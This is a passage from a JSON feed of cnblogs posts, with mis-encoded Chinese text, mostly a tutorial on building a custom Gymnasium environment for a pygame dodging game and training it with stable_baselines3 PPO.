rel=\"noopener nofollow\" target=\"_blank\"># Vibe Engineering in 2026.1</a><br />\n<a href=\"https://mp.weixin.qq.com/s/ZDWZNlKQ1weCPgOWNONGqw\" rel=\"noopener nofollow\" target=\"_blank\"># å‘Šåˆ« AI ä»£ç èƒŒé”…ï¼šä¸€ä»½å¯éªŒè¯ã€å¯è¿½è¸ªçš„ Vibe Coding å›¢é˜Ÿè§„èŒƒ</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-30 18:30</span>&nbsp;\n<a href=\"https://www.cnblogs.com/zer0Black\">é”…æ€»çš„ç¨‹åºäººç”Ÿ</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">100</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "stable_baseline3 å¿«é€Ÿå…¥é—¨(äºŒ): è®­ç»ƒè‡ªå®šä¹‰æ¸¸æˆï¼Œæ„å»ºGymnasiumè®­ç»ƒç¯å¢ƒ",
      "link": "https://www.cnblogs.com/ClownLMe/p/19554865",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ClownLMe/p/19554865\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-30 17:46\">\n    <span>stable_baseline3 å¿«é€Ÿå…¥é—¨(äºŒ): è®­ç»ƒè‡ªå®šä¹‰æ¸¸æˆï¼Œæ„å»ºGymnasiumè®­ç»ƒç¯å¢ƒ</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"ç®€ä»‹\">ç®€ä»‹</h1>\n<p><strong>Gymnasium</strong> ä¸ºå¼ºåŒ–å­¦ä¹ æä¾›äº†ä¸€ä¸ªæ ‡å‡†åŒ–çš„APIï¼Œå®ƒå®šä¹‰äº† Agent åº”è¯¥å¦‚ä½•è§‚å¯Ÿä¸–ç•Œã€å¦‚ä½•åšå‡ºåŠ¨ä½œä»¥åŠå¦‚ä½•è·å¾—å¥–åŠ±ï¼Œä¸ç®¡æ˜¯æ¸¸æˆï¼Œè¿˜æ˜¯å·¥ä¸šè®¾å¤‡ï¼Œåªéœ€è¦æ»¡è¶³<code>Gymnasium</code>æ ‡å‡†éƒ½èƒ½ä½¿ç”¨åŒä¸€å¥—ä»£ç è¿›è¡Œè®­ç»ƒã€‚</p>\n<h1 id=\"è®¤è¯†gymnasium\">è®¤è¯†Gymnasium</h1>\n<p>ä½¿ç”¨<code>stable_baseline3</code>åªéœ€è¦å®šä¹‰å¥½<code>Gymnasium</code>ç¯å¢ƒï¼Œå…³æ³¨è®­ç»ƒçš„å¥–åŠ±æœºåˆ¶ï¼Œå°†é‡ç‚¹æ”¾åœ¨ä¸šåŠ¡çš„å¼€å‘ä¸Šè€Œä¸æ˜¯å¤æ‚çš„ç®—æ³•ã€‚</p>\n<p><strong>Gymnasium</strong>æä¾›äº†å‡ ä¸ªæ ¸å¿ƒçš„apiï¼š</p>\n<table>\n<thead>\n<tr>\n<th><strong>æ–¹æ³•</strong></th>\n<th><strong>åŠŸèƒ½</strong></th>\n<th><strong>è¿”å›å€¼</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong><code>reset()</code></strong></td>\n<td>å°†ç¯å¢ƒé‡ç½®ä¸ºåˆå§‹çŠ¶æ€ï¼Œå¼€å§‹æ–°å›åˆã€‚</td>\n<td><code>obs, info</code></td>\n</tr>\n<tr>\n<td><strong><code>step(action)</code></strong></td>\n<td>ç¯å¢ƒå‘å‰æ¨è¿›ä¸€æ­¥ï¼Œæ‰§è¡ŒåŠ¨ä½œã€‚</td>\n<td><code>obs, reward, terminated, truncated, info</code></td>\n</tr>\n<tr>\n<td><strong><code>render()</code></strong></td>\n<td>å¯è§†åŒ–ç¯å¢ƒï¼ˆæ ¹æ® <code>render_mode</code> æ¸²æŸ“å›¾åƒæˆ–å¼¹å‡ºçª—å£ï¼‰ã€‚</td>\n<td>è§†é…ç½®è€Œå®šï¼ˆé€šå¸¸æ— æˆ–ä¸º <code>np.array</code>ï¼‰</td>\n</tr>\n<tr>\n<td><strong><code>close()</code></strong></td>\n<td>é‡Šæ”¾ç¯å¢ƒèµ„æºï¼ˆå…³é—­çª—å£ã€æ¸…ç†å†…å­˜ï¼‰ã€‚</td>\n<td>æ— </td>\n</tr>\n</tbody>\n</table>\n<p>å…¶ä¸­çš„å„ä¸ªè¿”å›å€¼çš„å«ä¹‰ï¼š</p>\n<ul>\n<li><strong><code>observation</code> (Object)</strong>: å½“å‰çŠ¶æ€çš„æè¿°ã€‚ä¾‹å¦‚æ•Œäººï¼Œç©å®¶çš„ä½ç½®ï¼Œç©å®¶çš„çŠ¶æ€ç­‰</li>\n<li><strong><code>reward</code> (Float)</strong>: ä¸Šä¸€æ­¥åŠ¨ä½œè·å¾—çš„å¥–åŠ±</li>\n<li><strong><code>terminated</code> (Bool)</strong>: æ˜¯å¦ç”±äº<strong>ä»»åŠ¡é€»è¾‘</strong>ç»“æŸã€‚ä¾‹å¦‚ï¼šåˆ°è¾¾ç»ˆç‚¹ã€æ‰è¿›å²©æµ†ç­‰</li>\n<li><strong><code>truncated</code> (Bool)</strong>: æ˜¯å¦ç”±äº<strong>å¤–éƒ¨é™åˆ¶</strong>ç»“æŸã€‚ä¾‹å¦‚ï¼šè¾¾åˆ°æœ€å¤§æ­¥æ•° 500 æ­¥</li>\n<li><strong><code>info</code> (Dict)</strong>: è¾…åŠ©è¯Šæ–­ä¿¡æ¯ï¼Œæ¨¡å‹è®­ç»ƒé€šå¸¸ä¸ç”¨ï¼Œç”¨äºç”¨æˆ·è‡ªå®šä¹‰è°ƒè¯•æˆ–è®°å½•é¢å¤–ç»Ÿè®¡ã€‚</li>\n</ul>\n<h1 id=\"æ‰‹åŠ¨æ„å»ºç¯å¢ƒ\">æ‰‹åŠ¨æ„å»ºç¯å¢ƒ</h1>\n<h3 id=\"æ¡ˆä¾‹\">æ¡ˆä¾‹</h3>\n<p>æ¡ˆä¾‹æè¿°ï¼šåˆ©ç”¨pygameæ„å»ºä¸€ä¸ªç®€å•çš„æ¸¸æˆï¼Œèº²é¿æ‰è½æ–¹å—ï¼Œåˆ©ç”¨æ„å»ºçš„å¥–åŠ±æœºåˆ¶ï¼Œè¿›è¡Œå¼ºåŒ–å­¦ä¹ ã€‚</p>\n<pre><code class=\"language-python\">import gymnasium as gym\nfrom gymnasium import spaces\nimport numpy as np\nimport pygame\nimport random\nimport cv2\nimport os\nfrom stable_baselines3 import PPO\nfrom stable_baselines3.common.callbacks import CheckpointCallback\nfrom stable_baselines3.common.env_checker import check_env\n\nclass MyEnv(gym.Env):\n    def __init__(self, render_mode=None):\n        super(MyEnv, self).__init__()\n\n        #åˆå§‹åŒ–å‚æ•°\n        self.width = 400\n        self.height = 300\n        self.player_size = 30\n        self.enemy_size = 30\n        self.render_mode = render_mode\n\n        self.action_space = spaces.Discrete(3)\n\n        self.observation_space = spaces.Box(\n            low=0, high=255, shape=(84, 84, 3), dtype=np.uint8\n        )\n\n        pygame.init()\n        if self.render_mode == \"human\":\n            self.screen = pygame.display.set_mode((self.width, self.height))\n        \n        self.canvas = pygame.Surface((self.width, self.height))\n        self.font = pygame.font.SysFont(\"monospace\", 15)\n\n    def reset(self, seed=None, options=None):\n        super().reset(seed=seed)\n\n        self.player_x = self.width // 2 - self.player_size // 2\n        self.player_y = self.height - self.player_size - 10\n        self.enemies = []\n        self.score = 0\n        self.frame_count = 0\n\n        self.current_speed = 5\n        self.spawn_rate = 30\n\n        return self._get_obs(), {}\n\n    def step(self, action):\n        reward = 0\n        terminated = False\n        truncated = False\n\n        move_speed = 8\n        if action == 1 and self.player_x &gt; 0: # \n            self.player_x -= move_speed\n            reward -= 0.05\n\n        if action == 2 and self.player_x &lt; self.width - self.player_size:\n            self.player_x += move_speed\n            reward -= 0.05\n\n        self.frame_count += 1\n\n        level = self.score // 5\n        self.current_speed = 5 + level\n        self.spawn_rate = 30 - level * 2\n        spawn_rate = max(10, 30 - level)\n\n        if self.frame_count &gt;= spawn_rate:\n            self.frame_count = 0\n            enemy_x = random.randint(0, self.width - self.enemy_size)\n            self.enemies.append([enemy_x, 0]) # [x, y]\n\n        for enemy in self.enemies:\n            enemy[1] += self.current_speed\n            \n            player_rect = pygame.Rect(self.player_x, self.player_y, self.player_size, self.player_size)\n            enemy_rect = pygame.Rect(enemy[0], enemy[1], self.enemy_size, self.enemy_size)\n            \n            if player_rect.colliderect(enemy_rect):\n                reward = -10 \n                terminated = True\n\n            elif enemy[1] &gt; self.height:\n                self.enemies.remove(enemy)\n                self.score += 1\n                reward = 1 \n        \n        if not terminated:\n            if self.score &gt; 100:\n                reward += 0.01\n            reward += 0.01\n\n        obs = self._get_obs()\n\n        if self.render_mode == \"human\":\n            self._render_window()\n\n        return obs, reward, terminated, truncated, {}\n\n    def _get_obs(self):\n        self.canvas.fill((0, 0, 0))\n        pygame.draw.rect(self.canvas, (50, 150, 255), (self.player_x, self.player_y, self.player_size, self.player_size))\n        \n        for enemy in self.enemies:\n            pygame.draw.rect(self.canvas, (255, 50, 50), (enemy[0], enemy[1], self.enemy_size, self.enemy_size))\n\n        img_array = pygame.surfarray.array3d(self.canvas)\n        img_array = np.transpose(img_array, (1, 0, 2))\n        obs = cv2.resize(img_array, (84, 84), interpolation=cv2.INTER_AREA)\n\n        return obs.astype(np.uint8)\n\n    def _render_window(self):\n        self.screen.blit(self.canvas, (0, 0))\n        text = self.font.render(f\"Score: {self.score}\", True, (255, 255, 255))\n        self.screen.blit(text, (10, 10))\n        pygame.display.flip()\n\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                pygame.quit()\n\ndef train():\n    log_dir = \"logs/DodgeGame\"\n    os.makedirs(log_dir, exist_ok=True)\n\n    env = MyEnv()\n    check_env(env)\n    print(\"ç¯å¢ƒæ£€æŸ¥é€šè¿‡...\")\n\n    model_path = \"models/dodge_ai.zip\"\n    if not os.path.exists(model_path):\n        print(\"ğŸ†• æœªå‘ç°æ—§æ¨¡å‹ï¼Œä»å¤´å¼€å§‹è®­ç»ƒ...\")\n        model = PPO(\n            \"CnnPolicy\", \n            env, \n            verbose=1,\n            tensorboard_log=log_dir,\n            learning_rate=0.0001,\n            n_steps=4096,\n            batch_size=256,\n            device=\"cuda\")\n        reset_timesteps = True\n    else:\n        print(\"å‘ç°æ—§æ¨¡å‹ï¼ŒåŠ è½½å¹¶ç»§ç»­è®­ç»ƒ...\")\n        model = PPO.load(\n            model_path, \n            env=env,      \n            device=\"cuda\",\n            custom_objects={\"learning_rate\": 0.0001, \"n_steps\": 4096, \"batch_size\": 256}\n        )\n        reset_timesteps = False\n   \n    print(\"å¼€å§‹è®­ç»ƒ...\")\n\n    model.learn(\n        total_timesteps=50000,\n        reset_num_timesteps=reset_timesteps\n    )\n\n    model.save(\"models/dodge_ai\")\n    print(\"æ¨¡å‹å·²ä¿å­˜ï¼\")\n    env.close()\n\ndef prodict():\n    env = MyEnv(render_mode=\"human\")\n    model = PPO.load(\"models/dodge_ai\", env=env, device=\"cuda\")\n    obs, _ = env.reset()\n\n    while True:\n        action, _states = model.predict(obs, deterministic=True)\n\n        obs, reward, terminated, truncated, info = env.step(action)\n\n        if terminated or truncated:\n            obs, _ = env.reset()\n        \n        pygame.time.Clock().tick(30)\n\nif __name__ == \"__main__\":\n    train()\n\n    prodict()\n\n</code></pre>\n<h3 id=\"ä»£ç è§£æ\">ä»£ç è§£æ</h3>\n<p>ä»£ç æµç¨‹å¦‚ä¸‹ï¼š<br />\n<strong>æ„å»ºæ¸¸æˆç¯å¢ƒ-&gt;è®­ç»ƒæ¨¡å‹-&gt;æ¨¡å‹é¢„æµ‹</strong><br />\næœ¬ç¯‡é‡ç‚¹è®²æ„<strong>å»ºæ¸¸æˆç¯å¢ƒ</strong>ï¼Œå…¶ä¸­çš„<code>pygame</code>ç›¸å…³ä»£ç ç®€ç•¥ï¼Œå¦å¤–ä¸¤ä¸ªæµç¨‹å‚è€ƒä¹‹å‰æ–‡ç« ã€‚</p>\n<h4 id=\"æ„å»ºæ¸¸æˆç¯å¢ƒ\">æ„å»ºæ¸¸æˆç¯å¢ƒ</h4>\n<h5 id=\"åˆå§‹åŒ–ç±»\">åˆå§‹åŒ–ç±»</h5>\n<p>è¯¥ç±»ç»§æ‰¿<code>gym.Env</code>ç±»</p>\n<pre><code class=\"language-python\">class MyEnv(gym.Env):\n</code></pre>\n<h5 id=\"æ„é€ å‡½æ•°__init__\">æ„é€ å‡½æ•°__init__</h5>\n<pre><code class=\"language-python\">def __init__(self, render_mode=None):\n        super(MyEnv, self).__init__()\n\n        #åˆå§‹åŒ–å‚æ•°\n        self.width = 400\n        self.height = 300\n        self.player_size = 30\n        self.enemy_size = 30\n        self.render_mode = render_mode\n\n        self.action_space = spaces.Discrete(3)\n\n        self.observation_space = spaces.Box(\n            low=0, high=255, shape=(84, 84, 3), dtype=np.uint8\n        )\n\n        pygame.init()\n        if self.render_mode == \"human\":\n            self.screen = pygame.display.set_mode((self.width, self.height))\n        \n        self.canvas = pygame.Surface((self.width, self.height))\n        self.font = pygame.font.SysFont(\"monospace\", 15)\n</code></pre>\n<p>åœ¨æ„é€ å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦å®Œæˆçš„æ˜¯å£°æ˜è®­ç»ƒçš„ç»´åº¦ï¼Œå’Œè¾“å…¥ï¼š</p>\n<ul>\n<li>è¾“å…¥ï¼š<code>self.action_space = spaces.Discrete(3)</code>å…¶ä¸­çš„<code>self.action_space</code>æ˜¯<strong>å›ºå®šåç§°çš„çˆ¶ç±»å˜é‡</strong>ã€‚<code>spaces.Discrete(3)</code>å£°æ˜è¾“å…¥çš„æ•°é‡ï¼Œä¾‹å¦‚ï¼š<code>å‘å·¦ å‘å³ å’Œ ä¸åŠ¨</code>3ä¸ªè¾“å…¥ã€‚</li>\n<li>è§‚æµ‹ç»´åº¦ï¼š<code>self.observation_space</code>ä¹Ÿæ˜¯<strong>å›ºå®šåç§°çš„çˆ¶ç±»å˜é‡</strong>ã€‚<code>spaces.Box</code>å£°æ˜è§‚æµ‹ç»´åº¦ã€‚</li>\n</ul>\n<pre><code class=\"language-python\">self.observation_space = spaces.Box(\n    low=0, high=255, shape=(84, 84, 3), dtype=np.uint8\n)\n</code></pre>\n<ol>\n<li><code>low</code>ï¼šè§‚æµ‹å‚æ•°çš„æœ€å°å€¼</li>\n<li><code>high</code>ï¼šè§‚æµ‹å‚æ•°çš„æœ€å¤§å€¼</li>\n<li><code>shape</code>ï¼šå£°æ˜ç»´åº¦ã€‚ä¾‹å¦‚ï¼šè§‚æµ‹å›¾ç‰‡<code>shape(é«˜ï¼Œå®½ï¼ŒRGB)</code>ï¼Œè§‚æµ‹ä¸€ä¸ªå¹³é¢ï¼Œ<code>shape(é«˜,å®½)</code></li>\n<li><code>dtype</code>ï¼šæ¯ä¸ªå˜é‡ç±»å‹ï¼Œè¿™é‡Œé€‰<code>np.uint8</code>èƒ½å¤ŸèŠ‚çœè®­ç»ƒæˆæœ¬ï¼Œé»˜è®¤æ˜¯æµ®ç‚¹å‹çš„ã€‚</li>\n</ol>\n<h5 id=\"ä»»åŠ¡é‡ç½®-reset\">ä»»åŠ¡é‡ç½® reset</h5>\n<p>ç›¸å½“äºåˆå§‹åŒ–æ¸¸æˆçŠ¶æ€ï¼Œæ¸¸æˆçš„é‡æ–°å¼€å§‹ã€‚è¿”å›çš„æ˜¯<strong>è§‚æµ‹å€¼</strong>å’Œ<strong>çŠ¶æ€ä¿¡æ¯ï¼ˆç”¨äºè°ƒè¯•æ—¥å¿—ï¼‰</strong></p>\n<pre><code class=\"language-python\">def reset(self, seed=None, options=None):\n        super().reset(seed=seed)\n\n        self.player_x = self.width // 2 - self.player_size // 2\n        self.player_y = self.height - self.player_size - 10\n        self.enemies = []\n        self.score = 0\n        self.frame_count = 0\n\n        self.current_speed = 5\n        self.spawn_rate = 30\n\n        return self._get_obs(), {}\n</code></pre>\n<p><strong>è§‚æµ‹å€¼ <code>_get_obs</code>ï¼š</strong><br />\né€šè¿‡<code>pygame</code>ç”»å‡ºçš„ç”»é¢ï¼Œç„¶åç”¨<code>opencv</code>è¿›è¡Œç®€å•å¤„ç†ï¼š</p>\n<ol>\n<li>è½¬æ¢åæ ‡è½´ï¼ˆç”±äº<code>opencv</code>åæ ‡xyè½´è·Ÿ<code>pygame</code>çš„xyæ˜¯é¢ å€’çš„ï¼‰</li>\n<li>å°†ç”»é¢ç¼©æ”¾åˆ°<code>84 * 84</code>ï¼ˆå¯ä»¥æé«˜è®­ç»ƒæ•ˆç‡ï¼‰</li>\n</ol>\n<pre><code class=\"language-python\">def _get_obs(self):\n        self.canvas.fill((0, 0, 0))\n        pygame.draw.rect(self.canvas, (50, 150, 255), (self.player_x, self.player_y, self.player_size, self.player_size))\n        \n        for enemy in self.enemies:\n            pygame.draw.rect(self.canvas, (255, 50, 50), (enemy[0], enemy[1], self.enemy_size, self.enemy_size))\n\n        img_array = pygame.surfarray.array3d(self.canvas)\n        img_array = np.transpose(img_array, (1, 0, 2))\n        obs = cv2.resize(img_array, (84, 84), interpolation=cv2.INTER_AREA)\n\n        return obs.astype(np.uint8)\n</code></pre>\n<h5 id=\"æ­¥-stepé‡è¦\">æ­¥ stepï¼ˆé‡è¦ï¼‰</h5>\n<p>è¿™ä¸ªå‡½æ•°æ˜¯å¼ºåŒ–è®­ç»ƒçš„<strong>æ ¸å¿ƒ</strong>ï¼Œè§„å®šäº†åœ¨<code>ä¸€å¸§</code>æˆ–è€…<code>ä¸€æ­¥</code>ï¼Œæˆ‘ä»¬ç»™AIçš„åˆ†æ•°ã€‚<br />\nåˆ†æ•°çš„è®¾ç½®è‡³å…³é‡è¦ï¼Œè¿™ç›´æ¥å†³å®šäº†è®­ç»ƒå‡ºæ¥AIçš„è´¨é‡<br />\næ ¹æ®ä¸‹é¢ä»£ç ï¼ˆå¤§éƒ¨åˆ†éƒ½æ˜¯æ¸¸æˆé€»è¾‘ï¼‰ï¼Œä¸»è¦è®²è®¾ç½®<strong>å¥–åŠ±åˆ†æ•°</strong>ï¼š</p>\n<ol>\n<li>åœ¨AIè¿›è¡Œç§»åŠ¨æ—¶ æƒ©ç½š 0.05 åˆ†</li>\n<li>åœ¨AIå­˜æ´»æ—¶ å¥–åŠ± 0.01åˆ†ï¼Œæ¸¸æˆåˆ†æ•°å¤§äº100æ—¶ å­˜æ´»å¥–åŠ± 0.02åˆ†</li>\n<li>åœ¨éšœç¢ç‰©å®Œå…¨ä¸‹è½æ—¶ å¥–åŠ± 1 åˆ†</li>\n<li>åœ¨ä¸éšœç¢ç‰©ç¢°æ’æ—¶ æƒ©ç½š 10 åˆ†</li>\n</ol>\n<pre><code class=\"language-python\">def step(self, action):\n        reward = 0\n        terminated = False\n        truncated = False\n\n        move_speed = 8\n        if action == 1 and self.player_x &gt; 0: # \n            self.player_x -= move_speed\n            reward -= 0.05\n\n        if action == 2 and self.player_x &lt; self.width - self.player_size:\n            self.player_x += move_speed\n            reward -= 0.05\n\n        self.frame_count += 1\n\n        level = self.score // 5\n        self.current_speed = 5 + level\n        self.spawn_rate = 30 - level * 2\n        spawn_rate = max(10, 30 - level)\n\n        if self.frame_count &gt;= spawn_rate:\n            self.frame_count = 0\n            enemy_x = random.randint(0, self.width - self.enemy_size)\n            self.enemies.append([enemy_x, 0]) # [x, y]\n\n        for enemy in self.enemies:\n            enemy[1] += self.current_speed\n            \n            player_rect = pygame.Rect(self.player_x, self.player_y, self.player_size, self.player_size)\n            enemy_rect = pygame.Rect(enemy[0], enemy[1], self.enemy_size, self.enemy_size)\n            \n            if player_rect.colliderect(enemy_rect):\n                reward = -10 \n                terminated = True\n\n            elif enemy[1] &gt; self.height:\n                self.enemies.remove(enemy)\n                self.score += 1\n                reward = 1 \n        \n        if not terminated:\n            if self.score &gt; 100:\n                reward += 0.01\n            reward += 0.01\n\n        obs = self._get_obs()\n\n        if self.render_mode == \"human\":\n            self._render_window()\n\n        return obs, reward, terminated, truncated, {}\n</code></pre>\n<h5 id=\"å±•ç¤ºæ¸¸æˆç”»é¢\">å±•ç¤ºæ¸¸æˆç”»é¢</h5>\n<p>ä¸‹é¢å®Œå…¨æ˜¯<code>pygame</code>ä»£ç ï¼Œç”¨äºæ˜¾ç¤ºæ¸¸æˆç”»é¢ï¼Œè¿™é‡Œå°±ä¸è§£é‡Šäº†ã€‚</p>\n<pre><code class=\"language-python\">def _render_window(self):\n        self.screen.blit(self.canvas, (0, 0))\n        text = self.font.render(f\"Score: {self.score}\", True, (255, 255, 255))\n        self.screen.blit(text, (10, 10))\n        pygame.display.flip()\n\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                pygame.quit()\n</code></pre>\n<p><strong>ä½ æˆåŠŸæˆä¸ºäº†ä¸€åè°ƒå‚ä¾ äº†ï¼Œå¿«æ¥è¯•è¯•å§ï¼</strong></p>\n<p><strong>å¦‚æœâ¤å–œæ¬¢â¤æœ¬ç³»åˆ—æ•™ç¨‹ï¼Œå°±ç‚¹ä¸ªå…³æ³¨å§ï¼Œåç»­ä¸å®šæœŸæ›´æ–°~</strong></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-30 17:46</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ClownLMe\">ClownLMe</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">27</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    }
  ]
}